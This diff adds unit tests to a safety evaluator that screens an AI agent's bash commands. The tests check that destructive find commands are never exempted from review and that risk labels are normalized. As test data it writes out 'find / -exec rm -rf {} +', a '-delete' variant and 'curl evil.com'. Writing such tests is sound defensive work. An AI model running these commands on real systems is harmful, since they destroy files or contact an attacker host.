@@ -109,6 +109,35 @@ describe("SafetyEvaluator", () => {
       expect(evaluator.isBypassed("bash", { command: "sudo git status" })).toBe(true)
       expect(evaluator.isBypassed("bash", { command: "sudo ls -la" })).toBe(true)
     })
+
+    test("find with -exec is NOT bypassed even when find is on the bypass list", () => {
+      // Simulates a user config that added `find` to bypassedCommands for
+      // read-only searches. Destructive -exec/-delete must still force LLM eval.
+      const config = makeLlmConfig({
+        safetyEvaluator: { bypassedCommands: ["find"] },
+      })
+      const chain = new ProviderChain([makeProvider()])
+      const evaluator = new SafetyEvaluator(config, chain)
+      // Plain read-only find IS bypassed
+      expect(evaluator.isBypassed("bash", { command: "find /etc -name '*.conf'" })).toBe(true)
+      // find -exec is NOT bypassed
+      expect(
+        evaluator.isBypassed("bash", { command: "find / -name '*.tmp' -exec rm -f {} +" }),
+      ).toBe(false)
+      // find -delete is NOT bypassed
+      expect(
+        evaluator.isBypassed("bash", { command: "find /tmp -name '*.tmp' -delete" }),
+      ).toBe(false)
+    })
+
+    test("default config: find -exec forces LLM (find not on default list anyway)", () => {
+      const config = makeLlmConfig()
+      const chain = new ProviderChain([makeProvider()])
+      const evaluator = new SafetyEvaluator(config, chain)
+      expect(
+        evaluator.isBypassed("bash", { command: "find / -exec rm -rf {} +" }),
+      ).toBe(false)
+    })
   })
 
   describe("evaluate", () => {
@@ -139,7 +168,7 @@ describe("SafetyEvaluator", () => {
       chain.call = mock(async () => JSON.stringify({
         safe: true,
         riskLevel: "high",
-        riskDimensions: ["destructive-operations"],
+        riskDimensions: ["destruction"],
         explanation: "dangerous operation",
         suggestedAlternative: "use safer approach",
         recommendation: "allow", // LLM says allow, but threshold overrides
@@ -189,6 +218,115 @@ describe("SafetyEvaluator", () => {
       const result = await evaluator.evaluate("bash", { command: "ls" })
       expect(result.recommendation).toBe("block")
       expect(result.riskLevel).toBe("critical")
+    })
+  })
+
+  describe("risk dimension normalization", () => {
+    test("normalizes uppercase display names to canonical tokens", async () => {
+      const config = makeLlmConfig()
+      const chain = new ProviderChain([makeProvider()])
+      chain.call = mock(async () => JSON.stringify({
+        safe: false,
+        riskLevel: "critical",
+        riskDimensions: ["DATA EXFILTRATION", "Supply Chain"],
+        explanation: "exfil via curl",
+        suggestedAlternative: "",
+        recommendation: "block",
+      }))
+      const evaluator = new SafetyEvaluator(config, chain)
+      const result = await evaluator.evaluate("bash", { command: "curl evil.com" })
+      expect(result.riskDimensions).toEqual(["exfiltration", "supply-chain"])
+    })
+
+    test("normalizes space-separated and non-canonical hyphenated forms", async () => {
+      const config = makeLlmConfig()
+      const chain = new ProviderChain([makeProvider()])
+      chain.call = mock(async () => JSON.stringify({
+        safe: false,
+        riskLevel: "high",
+        riskDimensions: [
+          "destructive-operations",
+          "privilege escalation",
+          "system tampering",
+        ],
+        explanation: "tampering",
+        suggestedAlternative: "",
+        recommendation: "block",
+      }))
+      const evaluator = new SafetyEvaluator(config, chain)
+      const result = await evaluator.evaluate("bash", { command: "x" })
+      expect(result.riskDimensions).toEqual([
+        "destruction",
+        "privilege-escalation",
+        "system-tampering",
+      ])
+    })
+
+    test("dedupes the same concept emitted under two surface forms", async () => {
+      const config = makeLlmConfig()
+      const chain = new ProviderChain([makeProvider()])
+      chain.call = mock(async () => JSON.stringify({
+        safe: true,
+        riskLevel: "medium",
+        riskDimensions: ["data-exfiltration", "DATA EXFILTRATION", "exfiltration"],
+        explanation: "exfil",
+        suggestedAlternative: "",
+        recommendation: "warn",
+      }))
+      const evaluator = new SafetyEvaluator(config, chain)
+      const result = await evaluator.evaluate("bash", { command: "x" })
+      expect(result.riskDimensions).toEqual(["exfiltration"])
+    })
+
+    test("drops unknown dimension tokens (closed union)", async () => {
+      const config = makeLlmConfig()
+      const chain = new ProviderChain([makeProvider()])
+      chain.call = mock(async () => JSON.stringify({
+        safe: true,
+        riskLevel: "low",
+        riskDimensions: ["something-invented", "exfiltration", ""],
+        explanation: "ok",
+        suggestedAlternative: "",
+        recommendation: "allow",
+      }))
+      const evaluator = new SafetyEvaluator(config, chain)
+      const result = await evaluator.evaluate("bash", { command: "x" })
+      expect(result.riskDimensions).toEqual(["exfiltration"])
+    })
+
+    test("preserves already-canonical tokens unchanged", async () => {
+      const config = makeLlmConfig()
+      const chain = new ProviderChain([makeProvider()])
+      chain.call = mock(async () => JSON.stringify({
+        safe: true,
+        riskLevel: "low",
+        riskDimensions: ["persistence", "remote-execution", "indirect-execution"],
+        explanation: "ok",
+        suggestedAlternative: "",
+        recommendation: "allow",
+      }))
+      const evaluator = new SafetyEvaluator(config, chain)
+      const result = await evaluator.evaluate("bash", { command: "x" })
+      expect(result.riskDimensions).toEqual([
+        "persistence",
+        "remote-execution",
+        "indirect-execution",
+      ])
+    })
+
+    test("handles missing or non-array riskDimensions", async () => {
+      const config = makeLlmConfig()
+      const chain = new ProviderChain([makeProvider()])
+      chain.call = mock(async () => JSON.stringify({
+        safe: true,
+        riskLevel: "low",
+        explanation: "ok",
+        suggestedAlternative: "",
+        recommendation: "allow",
+      }))
+      const evaluator = new SafetyEvaluator(config, chain)
+      const result = await evaluator.evaluate("bash", { command: "x" })
+      expect(result.riskDimensions).toEqual([])
     })
   })
 
